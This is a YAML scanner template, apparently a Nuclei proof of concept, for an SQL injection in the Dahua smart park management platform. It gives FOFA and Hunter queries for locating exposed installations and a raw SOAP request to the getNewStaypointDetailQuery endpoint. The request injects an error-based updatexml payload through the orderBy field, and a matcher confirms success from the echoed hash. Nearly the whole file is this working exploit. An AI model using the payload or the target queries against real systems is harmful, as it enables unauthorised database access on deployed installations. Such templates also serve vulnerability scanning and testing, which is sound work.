clean_poc_20260104/high/dahua-smart-park-getnewstaypointdetailquery-sqli.yaml

id: dahua-smart-park-getnewstaypointdetailquery-sqli

info:
  name: 大华-智慧园区综合管理平台-wpms-getNewStaypointDetailQuery-sql注入
  author: Abbbbb
  severity: high
  metadata:
    fofa-query: app="dahua-智慧园区综合管理平台"
    hunter-query: web.body="/WPMS/asset/lib/json2.js"


http:
  - raw:
      - |
        POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: text/xml;charset=UTF-8
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
        <soapenv:Header/>
        <soapenv:Body>
        <car:getNewStaypointDetailQuery>
        <!--type: string-->
        <searchJson>{}</searchJson>
        <!--type: string-->
        <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1)--"}</pageJson>
        <!--type: string-->
        <extend>quae divum incedo</extend>
        </car:getNewStaypointDetailQuery>
        </soapenv:Body>
        </soapenv:Envelope>
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==500 && contains(body,"e10adc3949ba59abbe56e057f20f883")'